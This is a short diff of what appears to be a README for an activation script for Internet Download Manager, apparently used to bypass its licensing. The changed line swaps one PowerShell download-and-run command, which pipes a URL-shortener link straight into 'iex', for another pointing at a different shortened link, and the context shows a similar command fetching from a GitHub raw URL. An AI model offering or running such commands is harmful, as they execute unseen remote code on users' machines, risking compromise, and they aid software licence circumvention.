@@ -42,7 +42,7 @@ iwr -useb https://raw.githubusercontent.com/LazyDevv/IDM-Activation-Script/main/
 ```
 or
 ```
-iwr -useb https://t.ly/qaEX | iex
+iwr -useb https://t.ly/SegsMujib | iex
 ```
 
 You will see the activation options, and follow onscreen instructions.
